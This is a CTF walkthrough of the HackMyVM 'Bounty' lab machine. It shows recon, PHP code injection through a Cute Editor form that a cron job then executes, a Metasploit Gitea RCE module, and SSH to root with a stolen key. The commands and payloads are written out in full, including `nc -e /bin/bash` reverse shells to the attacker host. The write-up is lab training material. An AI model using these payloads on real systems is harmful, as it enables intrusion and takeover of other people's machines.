# CTF Penetration Testing

## HackMyVM

### Bounty - Machine

#### Machine Description

- Machine name: [Bounty](https://hackmyvm.eu/machines/machine.php?vm=Bounty)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟨 Medium

<img src="https://hackmyvm.eu/img/vm/mez.png" alt="Bounty Machine Logo" width="150"/>

#### Tools Used

- Burp Suite
- curl
- ffuf
- Gobuster
- Metasploit
- Netcat
- Nikto
- Nmap
- pwncat-cs
- SearchSploit
- ZAP

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.118  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.118
192.168.56.140 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.140`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-11 14:56 CEST
Nmap scan report for 192.168.56.140
Host is up (0.00080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) ←
80/tcp open  http    nginx 1.18.0 ←
MAC Address: 08:00:27:5B:61:60 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.92 seconds
```

`whatweb -a 3 -v http://192.168.56.140`:
```
WhatWeb report for http://192.168.56.140
Status    : 200 OK
Title     : <None>
IP        : 192.168.56.140
Country   : RESERVED, ZZ

Summary   : HTTPServer[nginx/1.18.0], nginx[1.18.0]

Detected Plugins:
[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        String       : nginx/1.18.0 (from server string)

[ nginx ]
        Nginx (Engine-X) is a free, open-source, high-performance 
        HTTP server and reverse proxy, as well as an IMAP/POP3 
        proxy server. 

        Version      : 1.18.0
        Website     : http://nginx.net/

HTTP Headers:
        HTTP/1.1 200 OK
        Server: nginx/1.18.0
        Date: Fri, 11 Oct 2024 13:09:08 GMT
        Content-Type: text/html
        Last-Modified: Thu, 20 Oct 2022 08:19:45 GMT
        Transfer-Encoding: chunked
        Connection: close
        ETag: W/"635104a1-33"
        Content-Encoding: gzip
```

`nikto -h http://192.168.56.140`:
```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.140
+ Target Hostname:    192.168.56.140
+ Target Port:        80
+ Start Time:         2024-10-11 16:52:25 (GMT2)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /index.php?: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Multiple index files found: /index.html, /default.htm, /index.php. ←
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8102 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2024-10-11 16:52:52 (GMT2) (27 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

`curl -s http://192.168.56.140`:
```
* * * * * /usr/bin/php /var/www/html/document.html ←
```

`curl -s http://192.168.56.140/document.html`:
```php      
<?php
phpinfo();
?>
```

`curl -s http://192.168.56.140/default.htm`:
```html
<html>
<head>
        <title>PHP WYSIWYG Editor</title>
        <link rel="stylesheet" href="example.css" type="text/css" />
        <style type="text/css">
                #features li { margin:10px 0 10px 0;}
    </style>
</head>
<body>

[...]
```

`gobuster dir -u http://192.168.56.140 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,jpg,txt,zip -t 15`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.140
[+] Method:                  GET
[+] Threads:                 15
[+] Wordlist:                /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   500,400,401,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,bak,jpg,txt,zip,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 51]
/index.php            (Status: 200) [Size: 470]
/templates.php        (Status: 200) [Size: 5920]
/document.html        (Status: 200) [Size: 23]
/document             (Status: 301) [Size: 169] [--> http://192.168.56.140/document/]
/localization.php     (Status: 200) [Size: 3444]

[...]
```

`curl -s http://192.168.56.140/templates.php`:
```html
<html>
    <head>
                <title>Content management with templates -- PHP Content Management, PHP WYSIWYG, PHP HTML Editor, PHP Text Editor</title> ←
                 <link rel="stylesheet" href="php.css" type="text/css" />
        </head>
    <body>
        <form name="theForm" action="Edithtml.php?postback=true" method="post">
                                        <h1>Content management with templates </h1>
                                        <div>
                                                The basic idea behind a Content Management System (<b>CMS</b>) is to separate 
the management of content from design. Cute Editor allows the site designer to 
easily create and establish <b>templates</b> to give the site a uniform look. 
Templates may be modified when desired. 

                                                <br />
                                                <br />
                                        </div>

[...]
```

`zaproxy`

`Sites: http://192.168.56.140` > `<right-click>` > `Attack` > `Spider...` > `Starting Point: http://192.168.56.140`, `Recurse: enabled`, `Show Advanced Options: enabled` > `Start Scan` > `Export` > `./spider.csv`

`cat ./spider.csv`:
```
Processed,Method,URI,Flags
true,GET,http://192.168.56.140,Seed
true,GET,http://192.168.56.140/cuteeditor_files,Seed
true,GET,http://192.168.56.140/cuteeditor_files/Scripts/resource.php?type=license&_ver=1728653866100,Seed

[...]

false,GET,http://cutesoft.net/data/Fish.jpg,Out of Scope
true,POST,http://192.168.56.140/Edithtml.php?postback=true,
true,GET,http://192.168.56.140/cuteeditor_files/Images/1x1.gif?0.4161063,
```

`cat ./spider.csv | grep "true" | cut -d ',' -f 3 | tee ./spider_urls.list`:
```
http://192.168.56.140
http://192.168.56.140/cuteeditor_files
http://192.168.56.140/templates.php

[...]

http://192.168.56.140/cuteeditor_files/Images/1x1.gif?0.5972733
http://192.168.56.140/Edithtml.php?postback=true ←
http://192.168.56.140/cuteeditor_files/Images/1x1.gif?0.4161063
```

`firefox` > `http://192.168.56.140/Edithtml.php?postback=true`

`burpsuite`

`HTTP Request`:
```http
POST /Edithtml.php?postback=true HTTP/1.1
Host: 192.168.56.140
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
Origin: http://192.168.56.140
Connection: close
Referer: http://192.168.56.140/Edithtml.php?postback=true
Cookie: PHPSESSID=bo5uopb8kvqjm3v5u17obv21fn
Upgrade-Insecure-Requests: 1

Editor1=&Editor1ClientState=&Save.x=6&Save.y=6&textbox1=%3C%3Fphp+echo+%22TEST%22+%3F%3E ←
```
`HTTP Response`:
```http
HTTP/1.1 200 OK ←
Server: nginx/1.18.0
Date: Fri, 11 Oct 2024 14:57:34 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 39945

<html>	
    <head>
		<title>Edit Static Html Example -- PHP Content Management, PHP WYSIWYG, PHP HTML Editor, PHP Text Editor</title>
		 <link rel="stylesheet" href="php.css" type="text/css" />
	</head>
    <body>
	<form name="theForm" action="Edithtml.php?postback=true" method="post">
					<h1>Edit Static Html</h1>
					<div>
						This example demonstrates you can use Cute Editor to edit static html page. 
						<br />
						<br />
					</div>
					<br />
           <!-- CuteEditor Version 6.6 Editor1 Begin --> 
<textarea name='Editor1' id='Editor1' rows='13' cols='50' class='CuteEditorTextArea' style='DISPLAY: none; WIDTH: 100%; HEIGHT: 100%'></textarea>

[...]
```

`HTTP Request`:
```http
POST /Edithtml.php?postback=true HTTP/1.1
Host: 192.168.56.140
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
Origin: http://192.168.56.140
Connection: close
Referer: http://192.168.56.140/Edithtml.php?postback=true
Cookie: PHPSESSID=bo5uopb8kvqjm3v5u17obv21fn
Upgrade-Insecure-Requests: 1

Editor1=%3C%3Fphp+echo+%22TEST%22+%3F%3E&Editor1ClientState=&Save.x=6&Save.y=6&textbox1= ←
```
`HTTP Response`:
```http
HTTP/1.1 200 OK ←
Server: nginx/1.18.0
Date: Fri, 11 Oct 2024 14:59:42 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 40025

<html>	
    <head>
		<title>Edit Static Html Example -- PHP Content Management, PHP WYSIWYG, PHP HTML Editor, PHP Text Editor</title>
		 <link rel="stylesheet" href="php.css" type="text/css" />
	</head>
    <body>
	<form name="theForm" action="Edithtml.php?postback=true" method="post">
					<h1>Edit Static Html</h1>
					<div>
						This example demonstrates you can use Cute Editor to edit static html page. 
						<br />
						<br />
					</div>
					<br />
           <!-- CuteEditor Version 6.6 Editor1 Begin --> 
<textarea name='Editor1' id='Editor1' rows='13' cols='50' class='CuteEditorTextArea' style='DISPLAY: none; WIDTH: 100%; HEIGHT: 100%'>            &lt;?php echo &quot;TEST&quot; ?&gt; ←
</textarea>

[...]
```

`pwncat-cs -lp 4444`:
```
[13:13:13] Welcome to pwncat 🐈!
bound to 0.0.0.0:4444 ←
```

```
cmd='<?php system("nc -e /bin/bash 192.168.56.118 4444") ?>'; \
encoded_cmd=$(printf %s "$cmd" | jq -s -R -r @uri); \
echo $encoded_cmd
```
```
%3C%3Fphp%20system%28%22nc%20-e%20%2Fbin%2Fbash%20192.168.56.118%204444%22%29%20%3F%3E
```

`curl -s "http://192.168.56.140/Edithtml.php?postback=true" -d 'Editor1=%3C%3Fphp%20system%28%22nc%20-e%20%2Fbin%2Fbash%20192.168.56.118%204444%22%29%20%3F%3E&Editor1ClientState=&Save.x=6&Save.y=6&textbox1='`:
```html
<html>
    <head>
                <title>Edit Static Html Example -- PHP Content Management, PHP WYSIWYG, PHP HTML Editor, PHP Text Editor</title>
                 <link rel="stylesheet" href="php.css" type="text/css" />
        </head>
    <body>
        <form name="theForm" action="Edithtml.php?postback=true" method="post">
                                        <h1>Edit Static Html</h1>
                                        <div>
                                                This example demonstrates you can use Cute Editor to edit static html page. 
                                                <br />
                                                <br />
                                        </div>
                                        <br />
          <textarea name="Editor1" id='Editor1'  rows="13" cols="50" style="width: 780; height: 320" ID="Editor1">&lt;?php system(&quot;nc -e /bin/bash 192.168.56.118 4444&quot;) ?&gt;</textarea>                <textarea name="textbox1" rows="2" cols="20" id="textbox1" style="font-family:Arial;height:250px;width:730px;">
<?php system("nc -e /bin/bash 192.168.56.118 4444") ?>            </textarea> ←
                </form>
        </body>
</html>
```

```
[17:08:04] received connection from 192.168.56.140:37572 ←
[17:08:05] 0.0.0.0:4444: normalizing shell path
[17:08:06] 192.168.56.140:37572: registered new host w/ db
```

![Victim: hania](https://img.shields.io/badge/Victim-hania-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
hania ←
```

`id`:
```
uid=1000(hania) gid=1000(hania) grupos=1000(hania),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

`uname -a`:
```
Linux bounty 5.10.0-19-amd64 #1 SMP Debian 5.10.149-1 (2022-10-17) x86_64 GNU/Linux
```

`lsb_release -a`:
```
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 11 (bullseye)
Release:        11
Codename:       bullseye
```

`cd /home/hania`

`ls -alps ./`:
```
total 36
4 drwxr-xr-x 3 hania hania 4096 oct 20  2022 ./
4 drwxr-xr-x 4 root  root  4096 oct 20  2022 ../
0 lrwxrwxrwx 1 hania hania    9 oct 20  2022 .bash_history -> /dev/null
4 -rw-r--r-- 1 hania hania  220 oct 20  2022 .bash_logout
4 -rw-r--r-- 1 hania hania 3526 oct 20  2022 .bashrc
4 drwxr-xr-x 3 hania hania 4096 oct 20  2022 .local/
4 -rw-r--r-- 1 hania hania  807 oct 20  2022 .profile
4 -rw-r--r-- 1 hania hania   66 oct 20  2022 .selected_editor
4 -rw------- 1 hania hania   16 oct 20  2022 user.txt ←
4 -rw------- 1 hania hania  104 oct 20  2022 .Xauthority
```

`cat ./user.txt`:
```
HMVtuctictactoc ←
```

`ls -alps /var/www/html`:
```
total 3296
   4 drwxr-xr-x  7 root     root        4096 oct 20  2022 ./
   4 drwxr-xr-x  3 root     root        4096 oct 20  2022 ../
   4 -rw-r--r--  1 www-data www-data    3786 dic 18  2009 Ajax-Rich-Text-Editor.php
   4 -rw-r--r--  1 www-data www-data    2762 nov 25  2009 Auto-Adjusting-Height.php
  16 -rw-r--r--  1 www-data www-data   14806 mar 15  2011 CommonTasks.htm
   4 -rw-r--r--  1 www-data www-data    2778 nov 25  2009 custombuttons.php
   4 -rw-r--r--  1 www-data www-data    2331 nov 25  2009 custombuttons-popup.php
   4 -rw-r--r--  1 www-data www-data    1190 nov 25  2009 Customized-Toolbar.php
   4 drwxr-xr-x 11 www-data www-data    4096 oct 11  2021 cuteeditor_files/
   8 -rw-r--r--  1 www-data www-data    7422 mar 15  2011 default.htm
   8 -rw-r--r--  1 www-data www-data    7488 mar 15  2011 demo.htm
   8 -rw-r--r--  1 www-data www-data    6495 mar 15  2011 Deployment.htm
   4 drwxr-xr-x  2 www-data www-data    4096 nov 27  2018 document/
   4 -rw-r--r--  1 www-data www-data      54 oct 11 17:07 document.html ←

[...]
```

`cat /var/www/html/document.html`:
```php
<?php system("nc -e /bin/bash 192.168.56.118 4444") ?> ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`upload /home/kali/tools/pspy64 /home/hania/pspy64`:
```
/home/hania/pspy64 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 3.1/3.1 MB • 1.7 MB/s • 0:00:00
[17:37:52] uploaded 3.10MiB in 2.19 seconds ←
```

![Victim: hania](https://img.shields.io/badge/Victim-hania-64b5f6?logo=linux&logoColor=white)

`chmod u+x ./pspy64`

`./pspy64 > ./pspy64_output`

`cat ./pspy64_output`:
```
[...]

2024/10/11 17:40:01 CMD: UID=0     PID=1882   | /usr/sbin/CRON -f 
2024/10/11 17:40:01 CMD: UID=1000  PID=1884   | /usr/bin/php /var/www/html/document.html ←
2024/10/11 17:40:01 CMD: UID=1000  PID=1885   | sh -c nc -e /bin/bash 192.168.56.118 4444 ←

[...]
```

`ls -l /home`:
```
total 8
drwxr-xr-x 3 hania     hania     4096 oct 20  2022 hania
drwxr-xr-x 7 primavera primavera 4096 oct 20  2022 primavera ←
```

`ls -alps /home/primavera/`:
```
total 105088
     4 drwxr-xr-x  7 primavera primavera      4096 oct 20  2022 ./
     4 drwxr-xr-x  4 root      root           4096 oct 20  2022 ../
     0 lrwxrwxrwx  1 primavera primavera         9 oct 20  2022 .bash_history -> /dev/null
     4 -rw-r--r--  1 primavera primavera       220 oct 20  2022 .bash_logout
     4 -rw-r--r--  1 primavera primavera      3526 oct 20  2022 .bashrc
     4 drwxr-xr-x  3 primavera primavera      4096 oct 20  2022 custom/
     4 drwxr-xr-x 12 primavera primavera      4096 oct 20  2022 data/
     4 -rw-r--r--  1 primavera primavera       190 oct 20  2022 .gitconfig
105032 -rwxr-xr-x  1 primavera primavera 107546440 abr 21  2022 gitea
     4 drwxr-xr-x  3 primavera primavera      4096 oct 20  2022 .local/
     4 drwxr-xr-x  2 primavera primavera      4096 oct 20  2022 log/
     4 -rw-------  1 primavera primavera        31 oct 20  2022 note.txt
     4 -rw-r--r--  1 primavera primavera       807 oct 20  2022 .profile
     4 -rw-r--r--  1 primavera primavera        66 oct 20  2022 .selected_editor
     4 drwx------  2 primavera primavera      4096 oct 20  2022 .ssh/
     4 -rw-r--r--  1 primavera primavera       165 oct 20  2022 .wget-hsts
```

`sudo -l`:
```
Matching Defaults entries for hania on bounty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User hania may run the following commands on bounty:
    (primavera) NOPASSWD: /home/primavera/gitea \"\" ←
```

`file /home/primavera/gitea`:
```
/home/primavera/gitea: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, Go BuildID=lrInDu4iDVLdr86lABsW/RTFAikto3QfdLqdGv-LP/Gz6Dahbb233R_a6JhnnD/61FFpDpa0Jcn-znSRdEA, BuildID[sha1]=f00adb572d185fc78e92eb88a00ff662dd452851, not stripped
```

`ls -l /home/primavera/gitea`:
```
-rwxr-xr-x 1 primavera primavera 107546440 abr 21  2022 /home/primavera/gitea ←
```

`/home/primavera/gitea --help`:
```
NAME:
   Gitea - A painless self-hosted Git service

USAGE:
   gitea [global options] command [command options] [arguments...]

VERSION:
   1.16.6 built with GNU Make 4.1, go1.18.1 : bindata, sqlite, sqlite_unlock_notify ←

DESCRIPTION:
   By default, gitea will start serving using the webserver with no
arguments - which can alternatively be run by running the subcommand web.

[...]
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`searchsploit gitea`:
```
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
Gitea 1.12.5 - Remote Code Execution (Authenticated)    | multiple/webapps/49571.py
Gitea 1.16.6 - Remote Code Execution (RCE) (Metasploit) | multiple/webapps/51009.rb ←
Gitea 1.4.0 - Remote Code Execution                     | multiple/webapps/44996.py
Gitea 1.7.5 - Remote Code Execution                     | multiple/webapps/49383.py
-------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

![Victim: hania](https://img.shields.io/badge/Victim-hania-64b5f6?logo=linux&logoColor=white)

`/home/primavera/gitea \"\"`:
```
2024/10/11 17:53:23 cmd/web.go:102:runWeb() [I] Starting Gitea on PID: 1992
2024/10/11 17:53:23 ...s/setting/setting.go:957:loadFromConf() [F] Expect user 'primavera' but current user is: hania
```

`sudo -u primavera /home/primavera/gitea \"\"`:
```
2024/10/11 17:54:48 cmd/web.go:102:runWeb() [I] Starting Gitea on PID: 2046
2024/10/11 17:54:48 cmd/web.go:150:runWeb() [I] Global init

[...]

2024/10/11 17:54:49 cmd/web.go:208:listen() [I] Listen: http://0.0.0.0:3000
2024/10/11 17:54:49 cmd/web.go:212:listen() [I] AppURL(ROOT_URL): http://bounty:3000/
2024/10/11 17:54:49 cmd/web.go:215:listen() [I] LFS server enabled
2024/10/11 17:54:49 ...s/graceful/server.go:61:NewServer() [I] Starting new Web server: tcp:0.0.0.0:3000 on PID: 2046
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`firefox` > `http://192.168.56.140:3000/user/sign_up`

`burpsuite`

`HTTP Request`:
```http
POST /user/sign_up HTTP/1.1
Host: 192.168.56.140:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 131
Origin: null
Connection: close
Cookie: PHPSESSID=bo5uopb8kvqjm3v5u17obv21fn; i_like_gitea=49ec795a353fe0e6; _csrf=ADijvD3s8c3i7vDYrrPoxKVcQ2k6MTcyODY2MjE1NTY2NTY3NzI0Mg
Upgrade-Insecure-Requests: 1

_csrf=ADijvD3s8c3i7vDYrrPoxKVcQ2k6MTcyODY2MjE1NTY2NTY3NzI0Mg&user_name=hacker&email=hacker%40mail.com&password=hacker&retype=hacker ←
```
`HTTP Response`:
```http
HTTP/1.1 302 Found ←
Location: /
Set-Cookie: i_like_gitea=ab4546475922b3ac; Path=/; HttpOnly; SameSite=Lax
Set-Cookie: lang=en-US; Path=/; HttpOnly; SameSite=Lax
Set-Cookie: _csrf=; Path=/; Max-Age=0
Set-Cookie: macaron_flash=success%3DAccount%2Bwas%2Bsuccessfully%2Bcreated.; Path=/; HttpOnly; SameSite=Lax
X-Frame-Options: SAMEORIGIN
Date: Fri, 11 Oct 2024 15:58:26 GMT
Content-Length: 0
Connection: close
```

`msfconsole -q`

`search gitea`, `use exploit/multi/http/gitea_git_fetch_rce`, `set PAYLOAD cmd/unix/reverse_bash`, `show options`, `set RHOSTS 192.168.56.140`, `set RPORT 3000`,  `set LHOST 192.168.56.118`, `set LPORT 5555`, `set USERNAME hacker`, `set PASSWORD hacker`, `show targets`, `set TARGET Unix Command`, `exploit`:
```
[*] Started reverse TCP handler on 192.168.56.118:5555 ←
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: 1.16.6 ←
[*] Using URL: http://192.168.56.118:8080/
[*] Command shell session 1 opened (192.168.56.118:5555 -> 192.168.56.140:35942) at 2024-10-11 18:12:53 +0200 ←
```

![Victim: primavera](https://img.shields.io/badge/Victim-primavera-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
primavera ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`pwncat-cs -lp 6666`:
```
[19:31:14] Welcome to pwncat 🐈! 
bound to 0.0.0.0:6666 ←
```

![Victim: primavera](https://img.shields.io/badge/Victim-primavera-64b5f6?logo=linux&logoColor=white)

`nc -e /bin/bash 192.168.56.118 6666`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

```
[19:31:24] received connection from 192.168.56.140:45790 ←
[19:31:25] 192.168.56.140:45790: registered new host w/ db
```

![Victim: primavera](https://img.shields.io/badge/Victim-primavera-64b5f6?logo=linux&logoColor=white)

`id`:
```
uid=1001(primavera) gid=1001(primavera) groups=1001(primavera)
```

`cd /home/primavera`

`ls -alps ./`:
```
total 105088
     4 drwxr-xr-x  7 primavera primavera      4096 Oct 20  2022 ./
     4 drwxr-xr-x  4 root      root           4096 Oct 20  2022 ../
     0 lrwxrwxrwx  1 primavera primavera         9 Oct 20  2022 .bash_history -> /dev/null
     4 -rw-r--r--  1 primavera primavera       220 Oct 20  2022 .bash_logout
     4 -rw-r--r--  1 primavera primavera      3526 Oct 20  2022 .bashrc
     4 -rw-r--r--  1 primavera primavera       190 Oct 20  2022 .gitconfig
     4 drwxr-xr-x  3 primavera primavera      4096 Oct 20  2022 .local/
     4 -rw-r--r--  1 primavera primavera       807 Oct 20  2022 .profile
     4 -rw-r--r--  1 primavera primavera        66 Oct 20  2022 .selected_editor
     4 drwx------  2 primavera primavera      4096 Oct 20  2022 .ssh/
     4 -rw-r--r--  1 primavera primavera       165 Oct 20  2022 .wget-hsts
     4 drwxr-xr-x  3 primavera primavera      4096 Oct 20  2022 custom/
     4 drwxr-xr-x 13 primavera primavera      4096 Oct 11 19:28 data/
105032 -rwxr-xr-x  1 primavera primavera 107546440 Apr 21  2022 gitea
     4 drwxr-xr-x  2 primavera primavera      4096 Oct 20  2022 log/
     4 -rw-------  1 primavera primavera        31 Oct 20  2022 note.txt ←
```

`cat ./notes.txt`:
```
Im the shadow admin. Congrats.
```

`ls -alps ./.ssh`:
```
total 16
4 drwx------ 2 primavera primavera 4096 Oct 20  2022 ./
4 drwxr-xr-x 7 primavera primavera 4096 Oct 20  2022 ../
0 -rw------- 1 primavera primavera    0 Oct 20  2022 authorized_keys
4 -rw------- 1 primavera primavera 2602 Oct 20  2022 id_rsa ←
4 -rw-r--r-- 1 primavera primavera  570 Oct 20  2022 id_rsa.pub
```

`ssh -i ./.ssh/id_rsa root@localhost`:
```
Linux bounty 5.10.0-19-amd64 #1 SMP Debian 5.10.149-1 (2022-10-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Oct 11 19:34:48 2024 from ::1
```

![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
root ←
```

`id`:
```
uid=0(root) gid=0(root) groups=0(root) ←
```

`cd /root`

`ls -alps`:
```
total 36
4 drwx------  4 root root 4096 Oct 20  2022 ./
4 drwxr-xr-x 18 root root 4096 Oct 20  2022 ../
0 lrwxrwxrwx  1 root root    9 Oct 20  2022 .bash_history -> /dev/null
4 -rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
4 drwxr-xr-x  3 root root 4096 Oct 20  2022 .local/
4 -rw-------  1 root root  317 Oct 20  2022 .mysql_history
4 -rw-r--r--  1 root root  161 Jul  9  2019 .profile
4 -rw-r--r--  1 root root   66 Oct 20  2022 .selected_editor
4 drwx------  2 root root 4096 Oct 20  2022 .ssh/
4 -rw-------  1 root root   16 Oct 20  2022 root.txt ←
```

`cat ./root.txt`:
```
HMVtictictictic ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
